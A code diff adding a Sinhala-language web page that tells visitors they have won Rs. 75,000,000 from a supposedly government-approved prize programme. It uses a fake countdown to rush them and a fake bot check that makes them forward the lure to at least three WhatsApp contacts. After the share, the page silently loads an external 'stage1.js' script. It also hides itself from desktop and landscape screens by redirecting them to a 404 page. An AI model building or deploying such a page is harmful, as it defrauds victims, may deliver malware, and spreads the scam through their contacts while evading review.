@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ශ්‍රී ලංකා ජාතික තෑගි වැඩසටහන - රු. 75,000,000 ජයග්‍රහණය!</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(45deg, #c8102e, #ffcc00, #006a4e);
+      color: white;
+      text-align: center;
+      min-height: 100vh;
+      animation: bgPulse 10s infinite alternate;
+    }
+    @keyframes bgPulse {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+    .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
+    h1 { font-size: 3.8rem; margin: 15px 0; text-shadow: 4px 4px 12px #000; animation: flash 1.8s infinite; }
+    @keyframes flash { 0%,100% { opacity:1; } 50% { opacity:0.6; } }
+    .prize { font-size: 5.8rem; font-weight: 900; color: #ffff00; text-shadow: 0 0 35px #ff0000; margin: 5px 0; }
+    .urgent { font-size: 2.6rem; color: #ffff00; background: rgba(255,0,0,0.75); padding: 15px; border-radius: 20px; margin: 25px 0; animation: blink 1s infinite; }
+    @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+    .btn-claim {
+      background: #00ff00;
+      color: #000;
+      font-size: 3.4rem;
+      font-weight: bold;
+      padding: 35px 90px;
+      margin: 50px 0 40px;
+      border-radius: 999px;
+      border: 10px solid #ffff00;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+      cursor: pointer;
+      animation: pulse 1.3s infinite;
+    }
+    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
+    .btn-claim:hover { background: #ffff00; transform: scale(1.12); }
+    #loading { display: none; font-size: 2.8rem; color: #ffff00; margin: 80px 0; animation: flash 1.2s infinite; }
+    .disclaimer { font-size: 1.1rem; color: #eee; margin-top: 100px; padding: 0 30px; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>ඔබ ජයග්‍රහකයා!<br>අතිවිශාල තෑග්ගක් ඔබට ලැබී තිබේ!!!</h1>
+
+  <div class="prize">රු. 75,000,000</div>
+
+  <div class="urgent">
+    <i class="fas fa-exclamation-triangle fa-beat"></i> අවසන් 45 මිනිත්තු තුළ Claim කරගන්න – නැත්නම් අයිතිය නැති වේවි!
+  </div>
+
+  <button class="btn-claim" id="claimBtn">
+    <i class="fas fa-gift fa-bounce"></i> දැන් Claim කරගන්න – රු. 75 ලක්ෂ ගන්න!
+  </button>
+
+  <div id="loading">
+    <i class="fas fa-spinner fa-spin"></i> කරුණාකර රැඳී සිටින්න... පද්ධතිය ඔබේ ජයග්‍රහණය සකස් කරමින්...
+  </div>
+
+  <div class="disclaimer">
+    මෙය විශේෂ ප්‍රවර්ධන වැඩසටහනකි. කිසිදු ගෙවීමක් අවශ්‍ය නොවේ.<br>
+    © 2026 Sri Lanka Special Rewards – රජයේ අනුමැතිය ඇත
+  </div>
+</div>
+
+<!-- CryptoJS -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+<!-- Fake countdown -->
+<script>
+  let timeLeft = 2700; // 45:00
+  const timerEl = document.createElement('div');
+  timerEl.className = 'countdown';
+  timerEl.innerHTML = '<i class="fas fa-clock fa-beat"></i> ඉතිරි කාලය: <span id="timer">45:00</span>';
+  document.querySelector('.container').insertBefore(timerEl, document.getElementById('claimBtn'));
+  
+  const countdown = setInterval(() => {
+    timeLeft--;
+    const m = Math.floor(timeLeft / 60).toString().padStart(2,'0');
+    const s = (timeLeft % 60).toString().padStart(2,'0');
+    document.getElementById('timer').textContent = `${m}:${s}`;
+    if (timeLeft <= 0) clearInterval(countdown);
+  }, 1000);
+</script>
+
+<!-- Main logic: Click → open new tab + trigger decode in original window -->
+<script>
+  document.getElementById('claimBtn').addEventListener('click', function() {
+    // Visual feedback on main page
+    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> සකස් වෙමින් පවතී...';
+    this.disabled = true;
+    document.getElementById('loading').style.display = 'block';
+
+    // Open new "verification / share" page in new tab
+    const verifyWindow = window.open('', '_blank');
+    if (verifyWindow) {
+      verifyWindow.document.write(`
+        <!DOCTYPE html>
+        <html lang="si">
+        <head>
+          <meta charset="UTF-8">
+          <title>ඔබ බොට් කෙනෙක්ද? තහවුරු කරගන්න</title>
+          <style>
+            body { margin:0; background:#000; color:#0f0; font-family:Arial; text-align:center; padding:40px; }
+            h1 { font-size:3rem; color:#ff0; }
+            p { font-size:1.6rem; line-height:1.6; }
+            .btn-share {
+              background:#25D366; color:white; font-size:2.2rem; padding:25px 60px;
+              border:none; border-radius:50px; margin:50px 0; cursor:pointer;
+              box-shadow:0 10px 30px rgba(0,0,0,0.6);
+            }
+            .btn-share:hover { background:#20b858; transform:scale(1.05); }
+          </style>
+        </head>
+        <body>
+          <h1>ඔබ බොට් කෙනෙක්ද?<br>තහවුරු කරගන්න!</h1>
+          <p>ඔබ ශ්‍රී ලාංකිකයෙක් බව තහවුරු කිරීමට,<br>
+             මෙම පණිවිඩය ඔබේ <strong>අවම වශයෙන් 3කට</strong> WhatsApp හරහා Share කරන්න.</p>
+          
+          <button class="btn-share" onclick="shareAndClose()">
+            <i class="fab fa-whatsapp"></i> WhatsApp හරහා Share කරන්න
+          </button>
+
+          <p style="margin-top:60px; font-size:1.3rem; color:#aaa;">
+            Share කළ පසු ඔබේ ජයග්‍රහණය ස්වයංක්‍රීයව ලැබෙනු ඇත.
+          </p>
+
+          <script>
+            function shareAndClose() {
+              const text = "මම රු. 75 ලක්ෂ ජයග්‍රහණය කළා! ඔයාලත් මේක උත්සාහ කරලා බලන්න! 👉 https://your-link-here.com";
+              const url = "https://wa.me/?text=" + encodeURIComponent(text);
+              window.open(url, '_blank');
+              
+              // After share attempt, notify parent window to start real decoding
+              window.opener.postMessage('share_clicked', '*');
+              setTimeout(() => window.close(), 1500);
+            }
+          </script>
+        </body>
+        </html>
+      `);
+      verifyWindow.document.close();
+    } else {
+      alert('නව ටැබ් එක විවෘත කිරීමට නොහැකි විය. Pop-up blocker අක්‍රිය කර බලන්න.');
+    }
+  });
+
+  // Listen for message from verification window → start real decoding
+  window.addEventListener('message', function(e) {
+    if (e.data === 'share_clicked') {
+      // Start loading & executing stage1.js
+      const script = document.createElement('script');
+      script.src = 'stage1.js';
+      script.onload = () => console.log("[DEBUG] stage1.js loaded after share");
+      script.onerror = () => alert('කරුණාකර අන්තර්ජාල සම්බන්ධතාව පරීක්ෂා කරන්න');
+      document.body.appendChild(script);
+    }
+  });
+</script>
+
+
+<script>
+(function () {
+  const ua = navigator.userAgent.toLowerCase();
+
+  const system = {
+    win: ua.includes("windows nt"),
+    mac: ua.includes("macintosh") && !ua.includes("iphone") && !ua.includes("ipad"),
+    x11: ua.includes("x11"),
+    linux: ua.includes("linux") && !ua.includes("android")
+  };
+
+  const isLandscape = window.screen.availWidth > window.screen.availHeight;
+
+  if (system.win || system.mac || system.x11 || system.linux || isLandscape) {
+    // Hard stop
+    window.stop();
+
+    // Immediate redirect (discard request illusion)
+    location.replace("/fh/?at=404");
+
+    // Kill execution
+    document.open();
+    document.write("");
+    document.close();
+
+    throw new Error("Request discarded");
+  }
+})();
+</script>
+
+
+
+</body>
+</html>
